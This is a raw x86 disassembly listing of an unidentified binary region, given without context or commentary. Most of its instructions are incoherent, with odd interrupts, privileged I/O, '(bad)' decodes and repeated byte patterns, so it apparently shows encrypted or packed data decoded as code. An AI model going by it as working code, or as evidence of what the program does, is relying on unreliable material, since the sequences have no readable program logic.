  424b09:	mov    esp,0xa000000
  424b0e:	jbe    0x424ac0
  424b10:	or     dh,BYTE PTR [esi+0x15]
  424b13:	iret   
  424b14:	outs   dx,BYTE PTR ds:[esi]
  424b15:	std    
  424b16:	iret   
  424b17:	jno    0x424b89
  424b19:	or     dh,BYTE PTR [esi+0x2d]
  424b1c:	or     dh,BYTE PTR [esi+0x35]
  424b1f:	leave  
  424b20:	push   es
  424b21:	jo     0x424b23
  424b23:	add    BYTE PTR [eax],al
  424b25:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424b2b:	pushf  
  424b2c:	add    BYTE PTR [eax],al
  424b2e:	add    BYTE PTR [edx],cl
  424b30:	pop    ss
  424b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b32:	add    BYTE PTR [eax],al
  424b34:	add    cl,cl
  424b36:	push   es
  424b37:	lods   al,BYTE PTR ds:[esi]
  424b38:	add    BYTE PTR [eax],al
  424b3a:	add    BYTE PTR [edx-0x61],cl
  424b3d:	xchg   BYTE PTR ds:0xb406c9,dh
  424b43:	add    BYTE PTR [eax],al
  424b45:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b4b:	les    eax,FWORD PTR [eax]
  424b4d:	add    BYTE PTR [eax],al
  424b4f:	popa   
  424b50:	lahf   
  424b51:	xchg   BYTE PTR ds:0x9006c9,dh
  424b57:	add    BYTE PTR [eax],al
  424b59:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b5f:	aam    0x0
  424b61:	add    BYTE PTR [eax],al
  424b63:	call   0xa77d207
  424b68:	iret   
  424b69:	fadd   QWORD PTR [eax]
  424b6b:	add    BYTE PTR [eax],al
  424b6d:	leave  
  424b6e:	push   es
  424b6f:	in     al,0x0
  424b71:	add    BYTE PTR [eax],al
  424b73:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424b79:	add    ecx,ecx
  424b7b:	jbe    0x424b82
  424b7d:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424b83:	or     ecx,ecx
  424b85:	jbe    0x424b53
  424b87:	inc    ecx
  424b88:	lahf   
  424b89:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424b8f:	jbe    0x424bb6
  424b91:	pusha  
  424b92:	lahf   
  424b93:	xchg   BYTE PTR ds:0x493d76c9,dh
  424b99:	and    DWORD PTR [esi-0x3292c4cb],eax
  424b9f:	int3   
  424ba0:	push   es
  424ba1:	jo     0x424ba3
  424ba3:	add    BYTE PTR [eax],al
  424ba5:	shr    ebx,cl
  424ba7:	xchg   edx,eax
  424ba8:	add    DWORD PTR [edx],eax
  424baa:	scas   eax,DWORD PTR es:[edi]
  424bab:	or     esp,ecx
  424bad:	test   DWORD PTR [eax+eax*1+0x0],eax
  424bb1:	add    BYTE PTR [esp+eax*1-0x7],ch
  424bb5:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424bbb:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424bc5:	add    BYTE PTR [eax-0x7c],dh
  424bc8:	int    0xb3
  424bca:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424bd0:	inc    esp
  424bd1:	add    BYTE PTR [eax],al
  424bd3:	add    BYTE PTR [edx+0x70],ah
  424bd6:	add    BYTE PTR [ecx-0x78],dh
  424bd9:	or     dh,BYTE PTR [esi+0x7d]
  424bdc:	iret   
  424bdd:	jbe    0x424b9c
  424bdf:	jo     0x424bae
  424be1:	or     BYTE PTR ds:0x808081,ah
  424be7:	push   eax
  424be8:	int    0x76
  424bea:	jge    0x424bec
  424bec:	icebp  
  424bed:	int    0x76
  424bef:	std    
  424bf0:	int    0x8d
  424bf2:	std    
  424bf3:	cmp    edi,DWORD PTR [ecx+0x4]
  424bf6:	add    bh,bh
  424bf8:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424bfe:	push   ebx
  424bff:	ror    DWORD PTR [edx],cl
  424c01:	jbe    0x424c10
  424c03:	int    0x8d
  424c05:	std    
  424c06:	int    0x76
  424c08:	std    
  424c09:	cmp    ecx,DWORD PTR [edi]
  424c0b:	add    al,0x11
  424c0d:	call   ebx
  424c0f:	lods   eax,DWORD PTR ds:[esi]
  424c10:	sub    bl,dl
  424c12:	jmp    0x424ba6
  424c14:	push   ebx
  424c15:	jge    0x424be4
  424c17:	jbe    0x424bd6
  424c19:	inc    ebx
  424c1a:	rcl    esp,cl
  424c1c:	xchg   esi,eax
  424c1d:	or     dh,BYTE PTR [esi+0x75]
  424c20:	in     al,dx
  424c21:	das    
  424c22:	int    0x80
  424c24:	int    0x8d
  424c26:	jne    0x424c32
  424c28:	jbe    0x424be7
  424c2a:	int    0x76
  424c2c:	mov    ebp,0x4dd4d343
  424c31:	int    0x70
  424c33:	sbb    al,0xcd
  424c35:	mov    bl,0x25
  424c37:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424c41:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424c4b:	int    0xb3
  424c4d:	sub    eax,0xcd808081
  424c52:	xchg   esi,eax
  424c53:	dec    esp
  424c54:	int    0x62
  424c56:	cmp    al,0x87
  424c58:	xor    DWORD PTR [edx],ecx
  424c5a:	jo     0x424c80
  424c5c:	int    0x76
  424c5e:	stc    
  424c5f:	int    0x8d
  424c61:	stc    
  424c62:	cmp    edi,DWORD PTR [ecx+0x4]
  424c65:	add    bh,bh
  424c67:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c6d:	push   ebx
  424c6e:	ror    DWORD PTR [edx],cl
  424c70:	jbe    0x424c7f
  424c72:	int    0x96
  424c74:	and    al,0x9a
  424c76:	pop    ebx
  424c77:	mov    ebp,0xf5e2
  424c7c:	push   es
  424c7d:	ins    DWORD PTR es:[edi],dx
  424c7e:	das    
  424c7f:	add    eax,0x80808099
  424c84:	add    dh,dl
  424c86:	and    al,0xcd
  424c88:	lock pop ebx
  424c8a:	mov    ebp,0xf52c
  424c8f:	push   es
  424c90:	ins    DWORD PTR es:[edi],dx
  424c91:	das    
  424c92:	add    eax,0x808080c5
  424c97:	int    0x76
  424c99:	and    al,0xcd
  424c9b:	lock int 0xd5
  424c9e:	mov    ebp,0xfbe7
  424ca3:	push   es
  424ca4:	ins    DWORD PTR es:[edi],dx
  424ca5:	das    
  424ca6:	add    eax,0x808080d1
  424cab:	call   0x0:0xf90ebd5b
  424cb2:	push   es
  424cb3:	ins    DWORD PTR es:[edi],dx
  424cb4:	das    
  424cb5:	add    eax,0x8080802d
  424cba:	int    0x8
  424cbc:	and    eax,0x43808081
  424cc1:	sbb    al,0xd6
  424cc3:	sbb    cl,ch
  424cc5:	or     BYTE PTR [ecx],dl
  424cc7:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424cd1:	int    0x8d
  424cd3:	dec    esp
  424cd4:	add    BYTE PTR [ecx+0x70005b94],dl
  424cda:	and    al,0xcd
  424cdc:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424ce2:	or     ch,0x7d
  424ce5:	cmp    ecx,DWORD PTR [edi]
  424ce7:	add    al,0x11
  424ce9:	call   ebx
  424ceb:	jmp    0x424c7f
  424ced:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424cf3:	(bad)
  424cf7:	dec    ecx
  424cf8:	and    BYTE PTR [esi-0x778932cb],al
  424cfe:	int    0x8d
  424d00:	mov    ch,cl
  424d02:	jbe    0x424d28
  424d04:	shr    ebx,cl
  424d06:	xchg   edx,eax
  424d07:	adc    al,BYTE PTR [edx]
  424d09:	scas   eax,DWORD PTR es:[edi]
  424d0a:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424d10:	sbb    ch,cl
  424d12:	ins    BYTE PTR es:[edi],dx
  424d13:	cmp    al,0xcd
  424d15:	lea    ebp,[edi+eax*4]
  424d18:	lds    ecx,FWORD PTR [edx]
  424d1a:	outs   dx,BYTE PTR ds:[esi]
  424d1b:	adc    al,0xcd
  424d1d:	jbe    0x424d4b
  424d1f:	leave  
  424d20:	add    BYTE PTR [edi-0x327f7f80],0x76
  424d27:	sub    al,0xa
  424d29:	pushf  
  424d2a:	test   ch,cl
  424d2c:	jbe    0x424d5e
  424d2e:	int    0x8d
  424d30:	sub    al,0xa
  424d32:	outs   dx,BYTE PTR ds:[esi]
  424d33:	mov    ch,cl
  424d35:	jbe    0x424d4b
  424d37:	int    0x8d
  424d39:	sub    al,0xa
  424d3b:	outs   dx,BYTE PTR ds:[esi]
  424d3c:	dec    esp
  424d3d:	in     al,dx
  424d3e:	adc    al,0xcd
  424d40:	jbe    0x424d66
  424d42:	int    0x6c
  424d44:	cmp    al,0xcd
  424d46:	lea    ebp,[edi+eax*4]
  424d49:	lds    ecx,FWORD PTR [edx]
  424d4b:	outs   dx,BYTE PTR ds:[esi]
  424d4c:	adc    al,0xcd
  424d4e:	jbe    0x424d7c
  424d50:	add    al,0x2c
  424d52:	or     cl,0x76
  424d55:	icebp  
  424d56:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424d60:	cmp    ebx,ebp
  424d62:	int    0xc5
  424d64:	arpl   sp,bp
  424d66:	xchg   edx,eax
  424d67:	cmp    ebp,DWORD PTR [ebp-0x56]
  424d6a:	test   al,0xcb
  424d6c:	shl    BYTE PTR [eax+eax*4],cl
  424d6f:	xchg   esi,eax
  424d70:	int    0xed
  424d72:	jno    0x424de5
  424d74:	das    
  424d75:	mov    ebx,0x74cf146e
  424d7a:	mov    BYTE PTR [edi+ebp*1],bl
  424d7d:	mov    ebx,0x9a5b867e
  424d82:	leave  
  424d83:	jbe    0x424d82
  424d85:	dec    ecx
  424d86:	and    DWORD PTR [esi-0x672f5cb],eax
  424d8c:	push   es
  424d8d:	retf   
  424d8e:	aam    0xb4
  424d90:	popa   
  424d91:	shl    DWORD PTR [ecx],1
  424d93:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424d99:	out    0x88,al
  424d9b:	xchg   edx,edi
  424d9d:	pop    esi
  424d9e:	out    0x4c,al
  424da0:	or     BYTE PTR [ebp-0x33],0xdc
  424da4:	mov    BYTE PTR [edi-0x77197806],al
  424daa:	pop    esi
  424dab:	out    0x4c,al
  424dad:	cmp    BYTE PTR [edx-0x33],0x8d
  424db1:	std    
  424db2:	int    0xe6
  424db4:	std    
  424db5:	cmp    edx,DWORD PTR [ebx]
  424db7:	add    al,0xf8
  424db9:	call   ebx
  424dbb:	jmp    0xd41e1ae8
  424dc0:	in     al,dx
  424dc1:	xchg   edx,eax
  424dc2:	push   ebx
  424dc3:	cld    
  424dc4:	add    al,0xf2
  424dc6:	std    
  424dc7:	add    al,0xd3
  424dc9:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424dd0:	sub    BYTE PTR [ebx-0x6],dl
  424dd3:	adc    bh,al
  424dd5:	dec    ecx
  424dd6:	and    DWORD PTR [esi-0x2197ecb],eax
  424ddc:	int    0x8d
  424dde:	std    
  424ddf:	int    0xe6
  424de1:	std    
  424de2:	cmp    edx,DWORD PTR [ebx]
  424de4:	add    al,0xf8
  424de6:	call   ebx
  424de8:	jmp    0x424d7c
  424dea:	shr    ecx,cl
  424dec:	sub    BYTE PTR [ebx-0x10],dl
  424def:	inc    ebx
  424df0:	(bad)  
  424df1:	stc    
  424df2:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424df9:	ror    BYTE PTR [eax-0x12326980],cl
  424dff:	add    al,0xed
  424e01:	push   eax
  424e02:	leave  
  424e03:	jbe    0x424daa
  424e05:	mov    edx,0xc98080ac
  424e0a:	jbe    0x424dc1
  424e0c:	xchg   eax,ecx
  424e0e:	add    BYTE PTR [eax-0x68528937],0x40
  424e15:	add    BYTE PTR [eax-0x51068937],0x30
  424e1c:	test   BYTE PTR [eax-0x4a028937],al
  424e22:	lods   al,BYTE PTR ds:[esi]
  424e23:	add    BYTE PTR [eax+0x69f176c9],0x53
  424e2a:	add    BYTE PTR [eax-0x76a8937],0x42
  424e31:	add    BYTE PTR [eax-0x78628937],0x80
  424e38:	add    BYTE PTR [eax-0x2c428937],0xb8
  424e3f:	add    BYTE PTR [eax-0x32128937],0x71
  424e46:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424e4d:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424e54:	mov    al,BYTE PTR [eax-0x322ccc80]
  424e5a:	(bad)  
  424e5b:	stc    
  424e5c:	cmp    ebx,edx
  424e5e:	clc    
  424e5f:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424e65:	repnz popa 
  424e67:	and    al,BYTE PTR [eax-0x7a34ed80]
  424e6d:	mov    BYTE PTR [eax+0x42021280],0xa4
  424e74:	add    BYTE PTR [eax+0x3cded312],0x80
  424e7b:	or     cl,0x76
  424e7e:	cmc    
  424e7f:	icebp  
  424e80:	lea    eax,[eax-0x2893680]
  424e86:	jnp    0x424e5c
  424e88:	add    BYTE PTR [eax+0x18f976c9],0x30
  424e8f:	add    BYTE PTR [eax-0x32068933],0x96
  424e96:	std    
  424e97:	ss dec eax
  424e99:	pushf  
  424e9a:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424ea1:	int    0xe3
  424ea3:	push   esi
  424ea4:	jp     0x424ea5
  424ea6:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424ead:	int    0x76
  424eaf:	std    
  424eb0:	xchg   DWORD PTR [esi-0x78],esi
  424eb3:	int    0x96
  424eb5:	std    
  424eb6:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424ebc:	xor    ch,cl
  424ebe:	jbe    0x424ed1
  424ec0:	int    0x96
  424ec2:	in     eax,dx
  424ec3:	sbb    BYTE PTR ss:[edi-0x80],cl
  424ec7:	cmp    BYTE PTR [ebx],0xd2
  424eca:	int    0x96
  424ecc:	mov    ebp,0xe261d253
  424ed1:	fadd   DWORD PTR [eax-0x320ecc80]
  424ed7:	jbe    0x424e8e
  424ed9:	xchg   DWORD PTR [ebx],edx
  424edb:	popa   
  424edc:	fist   WORD PTR [eax+eax*4-0x80]
  424ee0:	xor    esi,ecx
  424ee2:	xchg   DWORD PTR [esi-0x5a893253],edx
  424ee8:	int    0xd6
  424eea:	xor    ch,cl
  424eec:	out    0x9d,al
  424eee:	adc    bh,bl
  424ef0:	mov    DWORD PTR [ecx-0x80],esi
  424ef3:	sub    BYTE PTR [ebx],0xf1
  424ef6:	int    0x76
  424ef8:	xchg   ebp,eax
  424ef9:	adc    bh,bl
  424efb:	mov    dh,0x2c
  424efd:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424f04:	clc    
  424f05:	int    0x96
  424f07:	icebp  
  424f08:	push   esi
  424f09:	out    0x1e,al
  424f0b:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424f12:	icebp  
  424f13:	adc    dh,bl
  424f15:	pop    es
  424f16:	push   edx
  424f17:	add    BYTE PTR [eax+0x72f9943],0x63
  424f1e:	add    BYTE PTR [eax],al
  424f20:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424f26:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424f2d:	pop    ebx
  424f2e:	cwde   
  424f2f:	call   0x8043:0xd9ed76c9
  424f36:	or     cl,0x76
  424f39:	adc    DWORD PTR [edx+0x7e],esi
  424f3c:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424f43:	add    BYTE PTR [eax+0xbf976c9],0x71
  424f4a:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424f51:	add    BYTE PTR [eax-0x275a8937],0x58
  424f58:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424f5f:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424f66:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424f6d:	add    BYTE PTR [eax-0x449a8937],0x6f
  424f74:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424f7b:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424f82:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424f89:	add    BYTE PTR [eax-0x44f28937],0x4d
  424f90:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424f97:	add    BYTE PTR [eax-0x32528933],0x8d
  424f9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f9f:	dec    ebp
  424fa0:	bound  ebp,QWORD PTR [ebx]
  424fa2:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424fa9:	dec    ebp
  424faa:	pop    ds
  424fab:	and    eax,DWORD PTR [eax-0x2c2ed080]
  424fb1:	pop    edi
  424fb2:	xchg   ecx,eax
  424fb3:	mov    bh,0x7e
  424fb5:	stc    
  424fb6:	xor    edi,DWORD PTR [ebp-0x33]
  424fb9:	jbe    0x424fb8
  424fbb:	int    0x96
  424fbd:	stc    
  424fbe:	sub    edx,edx
  424fc0:	int    0x96
  424fc2:	cmc    
  424fc3:	dec    ebp
  424fc4:	inc    edi
  424fc5:	outs   dx,DWORD PTR ds:[esi]
  424fc6:	add    BYTE PTR [eax-0x69322dcd],0x11
  424fcd:	xor    edx,edx
  424fcf:	int    0x96
  424fd1:	in     eax,dx
  424fd2:	push   ebx
  424fd3:	sar    BYTE PTR [ebx],cl
  424fd5:	fisubr DWORD PTR [ecx-0x27]
  424fd8:	ret    
  424fd9:	add    BYTE PTR [eax],al
  424fdb:	clc    
  424fdc:	test   ebp,0x72c34c96
  424fe2:	push   ds
  424fe3:	add    BYTE PTR [eax+0x76cdf133],0xbd
  424fea:	int    0xd6
  424fec:	mov    ch,0x33
  424fee:	leave  
  424fef:	das    
  424ff0:	sar    DWORD PTR [ecx+0x69],1
  424ff3:	fisttp DWORD PTR [edx]
  424ff5:	xchg   ecx,eax
  424ff6:	mov    ebx,ebp
  424ff8:	popa   
  424ff9:	add    BYTE PTR [eax-0x6a893680],0x9b
  425000:	push   esp
  425001:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  425008:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  42500f:	add    BYTE PTR [eax-0x7e5a8937],0x80
  425016:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  42501d:	pop    ebp
  42501e:	call   0xcdf4:0xf880806f
  425025:	xchg   esi,eax
  425026:	lods   eax,DWORD PTR ds:[esi]
  425027:	int    0xa6
  425029:	mov    BYTE PTR [ebx-0x2e],dl
  42502c:	int    0x96
  42502e:	popf   
  42502f:	xor    edx,edx
  425031:	int    0x96
  425033:	xchg   ebp,eax
  425034:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  425036:	push   eax
  425037:	add    BYTE PTR [eax-0x302d2ed1],0x5
  42503e:	mov    BYTE PTR [eax+0x2c],bl
  425041:	ret    0xafd
  425044:	jbe    0x424fdb
  425046:	int    0x76
  425048:	icebp  
  425049:	int    0x96
  42504b:	or     eax,0xf3f7f534
  425050:	int    0x96
  425052:	xchg   ebp,eax
  425053:	xor    al,0x23
  425055:	inc    esp
  425056:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  42505a:	inc    esi
  42505b:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  425062:	rol    esi,0x80
  425065:	add    BYTE PTR [edi-0x59328a8a],0x6d
  42506c:	cmp    ebx,edx
  42506e:	clc    
  42506f:	hlt    
  425070:	int    0x96
  425072:	gs mov edi,0xc3d9
  425078:	ss aaa 
  42507a:	push   esi
  42507b:	add    BYTE PTR [eax+0xc56d233],0x6d
  425082:	add    BYTE PTR [eax],al
  425084:	xchg   DWORD PTR [ebp-0x33],edi
  425087:	jbe    0x425086
  425089:	int    0x96
  42508b:	stc    
  42508c:	sub    edx,edx
  42508e:	int    0x96
  425090:	cmc    
  425091:	dec    ebp
  425092:	inc    edi
  425093:	outs   dx,DWORD PTR ds:[esi]
  425094:	add    BYTE PTR [eax-0x69322dcd],0x11
  42509b:	xor    edx,edx
  42509d:	int    0x96
  42509f:	in     eax,dx
  4250a0:	push   ebx
  4250a1:	sar    BYTE PTR [ebx],cl
  4250a3:	(bad)  
  4250a5:	hlt    
  4250a6:	int    0x96
  4250a8:	dec    esp
  4250a9:	xor    esi,ecx
  4250ab:	int    0x76
  4250ad:	mov    ebp,0x33b5a6cd
  4250b2:	leave  
  4250b3:	das    
  4250b4:	rol    ebp,1
  4250b6:	int    0xdb
  4250b8:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  4250be:	das    
  4250bf:	pop    es
  4250c0:	pop    esp
  4250c1:	add    BYTE PTR [eax],al
  4250c3:	add    BYTE PTR [edx-0x2d349c58],ch
  4250c9:	mov    BYTE PTR [eax+0x4edcd96],al
  4250cf:	in     eax,dx
  4250d0:	jo     0x42509b
  4250d2:	jbe    0x4250a4
  4250d4:	xchg   ecx,eax
  4250d5:	aaa    
  4250d6:	ficom  WORD PTR [ebx]
  4250d8:	pop    ebp
  4250d9:	mov    ebp,0xa25230a
  4250de:	jbe    0x425135
  4250e0:	leave  
  4250e1:	jbe    0x425140
  4250e3:	mov    esi,0xa13de37
  4250e8:	jbe    0x42514f
  4250ea:	leave  
  4250eb:	jbe    0x42515a
  4250ed:	fidiv  WORD PTR [edi]
  4250ef:	ficom  WORD PTR [ebx]
  4250f1:	or     dh,BYTE PTR [esi+0x75]
  4250f4:	pop    ebx
  4250f5:	leave  
  4250f6:	jbe    0x425175
  4250f8:	scas   al,BYTE PTR es:[edi]
  4250f9:	aaa    
  4250fa:	ficom  WORD PTR [ebx]
  4250fc:	or     dh,BYTE PTR [esi+0xd]
  4250ff:	cwde   
  425100:	call   0xde37:0x96f176c9
  425107:	adc    ecx,DWORD PTR [edx]
  425109:	jbe    0x4250a0
  42510b:	cmp    ebx,edx
  42510d:	cmp    eax,DWORD PTR [eax]
  42510f:	pop    edi
  425110:	dec    ecx
  425111:	and    DWORD PTR [esi-0x628936cb],eax
  425117:	out    0x37,al
  425119:	ficom  WORD PTR [ebx]
  42511b:	jp     0x425127
  42511d:	jbe    0x4250c4
  42511f:	int    0xd3
  425121:	or     dl,BYTE PTR [esi-0x4a19f513]
  425127:	iret   
  425128:	xchg   ecx,eax
  425129:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  425130:	push   ebx
  425131:	ror    bh,cl
  425133:	je     0x4250fc
  425135:	ror    ch,1
  425137:	xor    ch,cl
  425139:	pushf  
  42513a:	test   BYTE PTR [edi],ch
  42513c:	inc    ebp
  42513d:	loop   0x4250d1
  42513f:	shr    esp,cl
  425141:	xchg   edx,eax
  425142:	int    0x1c
  425144:	int    0x6c
  425146:	test   BYTE PTR [ebx],bh
  425148:	ins    DWORD PTR es:[edi],dx
  425149:	adc    bh,bl
  42514b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42514c:	mov    esi,0xf1534229
  425151:	or     dl,BYTE PTR [esi-0x6893207]
  425157:	xchg   DWORD PTR [ebp-0x2d],ebp
  42515a:	in     eax,0x28
  42515c:	inc    ebx
  42515d:	jbe    0x4251ab
  42515f:	das    
  425160:	or     BYTE PTR [edi-0x327f7f80],bh
  425166:	jbe    0x425161
  425168:	add    al,0xb6
  42516a:	mov    ebp,0x11e60a80
  42516f:	int    0x76
  425171:	stc    
  425172:	push   es
  425173:	ins    DWORD PTR es:[edi],dx
  425174:	aam    0xb6
  425176:	cmp    ebp,DWORD PTR [ebp+0xa]
  425179:	out    0xf5,al
  42517b:	int    0x96
  42517d:	mov    ebp,0xcf88a6cd
  425182:	fs xor ch,cl
  425185:	xchg   esi,eax
  425186:	mov    BYTE PTR [edi-0x5269f527],al
  42518c:	retf   0x922
  42518f:	xchg   esi,eax
  425190:	add    ch,cl
  425192:	xchg   esi,eax
  425193:	stc    
  425194:	xchg   ecx,ebx
  425196:	retf   0x2014
  425199:	int    0xa6
  42519b:	lods   eax,DWORD PTR ds:[esi]
  42519c:	or     DWORD PTR [ebx],ebx
  42519e:	retf   0x96
  4251a1:	int    0xa6
  4251a3:	stc    
  4251a4:	xchg   ecx,esp
  4251a6:	int    0xe6
  4251a8:	mov    BYTE PTR [ecx],cl
  4251aa:	adc    al,0x43
  4251ac:	int    0x96
  4251ae:	cmc    
  4251af:	ins    BYTE PTR es:[edi],dx
  4251b0:	add    al,0xea
  4251b2:	std    
  4251b3:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  4251b9:	push   ebx
  4251ba:	sar    BYTE PTR [ebx],cl
  4251bc:	ror    DWORD PTR [edx],cl
  4251be:	jbe    0x4251b5
  4251c0:	push   ecx
  4251c1:	(bad)  
  4251c2:	cmc    
  4251c3:	int    0x96
  4251c5:	cmc    
  4251c6:	add    al,0x11
  4251c8:	call   ebx
  4251ca:	repz xchg edx,eax
  4251cc:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251d2:	xchg   esi,eax
  4251d3:	stc    
  4251d4:	inc    ebx
  4251d5:	rol    BYTE PTR [edx+0x7a003ba7],cl
  4251db:	int    0x76
  4251dd:	adc    ebp,ecx
  4251df:	xchg   esi,eax
  4251e0:	stc    
  4251e1:	int    0xa6
  4251e3:	mov    ebp,0xcffdad04
  4251e8:	test   cl,dh
  4251ea:	int    0x96
  4251ec:	stc    
  4251ed:	iret   
  4251ee:	adc    al,0x5b
  4251f0:	int    0xa6
  4251f2:	dec    esp
  4251f3:	shl    ebx,cl
  4251f5:	sub    BYTE PTR [ebx-0x2e],dl
  4251f8:	cmp    edx,ebx
  4251fa:	or     dh,BYTE PTR [esi+0x11]
  4251fd:	push   ecx
  4251fe:	(bad)  
  4251ff:	adc    ebp,ecx
  425201:	xchg   esi,eax
  425202:	adc    DWORD PTR [ecx+edx*1],eax
  425205:	call   ebx
  425207:	repz xchg edx,eax
  425209:	shr    DWORD PTR [ebp-0x322dacd8],cl
  42520f:	xchg   esi,eax
  425210:	stc    
  425211:	xchg   edx,ebx
  425213:	xor    esp,edx
  425215:	or     dh,BYTE PTR [esi-0x43]
  425218:	inc    ebx
  425219:	lds    ebp,FWORD PTR [edi]
  42521b:	pop    es
  42521c:	outs   dx,DWORD PTR ds:[esi]
  42521d:	add    BYTE PTR [eax],al
  42521f:	add    ch,cl
  425221:	jbe    0x425210
  425223:	int    0x96
  425225:	mov    ch,0x4
  425227:	jmp    0xd384:0xd2046cfd
  42522e:	mov    ebp,0x3bd25328
  425233:	ror    ebp,cl
  425235:	popf   
  425236:	int    0xf1
  425238:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  42523e:	in     eax,0x28
  425240:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  425246:	or     ah,BYTE PTR [esi-0x12697613]
  42524c:	add    al,0xe6
  42524e:	in     eax,dx
  42524f:	xchg   BYTE PTR [edi],ch
  425251:	or     edx,DWORD PTR [ebp-0x55ffff01]
  425257:	test   al,0x63
  425259:	retf   
  42525a:	ror    BYTE PTR [eax-0x12326980],cl
  425260:	add    al,0xed
  425262:	adc    al,0xcd
  425264:	jbe    0x4251ee
  425266:	leave  
  425267:	jbe    0x42527a
  425269:	dec    ecx
  42526a:	and    DWORD PTR [esi-0x28936cb],eax
  425270:	inc    ecx
  425271:	and    DWORD PTR [esi+0x5b80cd35],eax
  425277:	cwde   
  425278:	or     dh,BYTE PTR [esi-0x7]
  42527b:	leave  
  42527c:	jbe    0x425273
  42527e:	into   
  42527f:	and    DWORD PTR [esi+0x76c99a35],eax
  425285:	in     eax,dx
  425286:	inc    esi
  425287:	sbb    DWORD PTR [ebp-0x22932de],esi
  42528d:	int    0x8d
  42528f:	std    
  425290:	sar    bh,0x5d
  425293:	shl    DWORD PTR [ecx],1
  425295:	xchg   BYTE PTR ds:0xd3f03baa,dh
  42529b:	repnz sub BYTE PTR [ebx],bh
  42529e:	adc    ebx,edx
  4252a0:	out    dx,eax
  4252a1:	xchg   edx,eax
  4252a2:	push   ebx
  4252a3:	add    cl,ch
  4252a5:	lea    edx,[ecx]
  4252a7:	int    0x96
  4252a9:	adc    DWORD PTR [ebx],edi
  4252ab:	jge    0x4252e8
  4252ad:	(bad)  
  4252af:	jmp    0x425243
  4252b1:	shr    edx,cl
  4252b3:	sub    BYTE PTR [ebx+0x13],dl
  4252b6:	das    
  4252b7:	rol    DWORD PTR [edx],1
  4252b9:	jmp    0x42525a
  4252bb:	add    BYTE PTR [eax-0x6723280],0xcd
  4252c2:	xchg   esi,eax
  4252c3:	stc    
  4252c4:	cmp    ebx,ecx
  4252c6:	shr    edx,cl
  4252c8:	sub    BYTE PTR [ebx],bh
  4252ca:	jge    0x42529f
  4252cc:	jmp    0x425260
  4252ce:	push   ebx
  4252cf:	adc    ecx,ebp
  4252d1:	xchg   esi,eax
  4252d2:	std    
  4252d3:	int    0xa6
  4252d5:	std    
  4252d6:	cmp    esi,ecx
  4252d8:	cmp    esp,ecx
  4252da:	shl    ebx,cl
  4252dc:	xchg   edx,eax
  4252dd:	shl    ebp,cl
  4252df:	sub    BYTE PTR [ebx-0x2b],dl
  4252e2:	push   es
  4252e3:	adc    ecx,ebp
  4252e5:	xchg   esi,eax
  4252e6:	stc    
  4252e7:	int    0x8d
  4252e9:	stc    
  4252ea:	aam    0x58
  4252ec:	cmp    esi,eax
  4252ee:	shl    edx,cl
  4252f0:	sub    BYTE PTR [ebx],bh
  4252f2:	icebp  
  4252f3:	shl    ebx,cl
  4252f5:	xchg   edx,eax
  4252f6:	push   ebx
  4252f7:	jecxz  0x4252c6
  4252f9:	(bad)  
  4252fa:	std    
  4252fb:	int    0xa6
  4252fd:	std    
  4252fe:	cmp    edi,DWORD PTR [ebp+0x3b]
  425301:	loope  0x4252d6
  425303:	jmp    0x425297
  425305:	shl    ebp,cl
  425307:	sub    BYTE PTR [ebx+0xc],dl
  42530a:	aad    0xf3
  42530c:	int    0x8d
  42530e:	in     eax,dx
  42530f:	int    0xa6
  425311:	in     eax,dx
  425312:	cmp    edi,DWORD PTR [ebp+0x3b]
  425315:	loope  0x4252ea
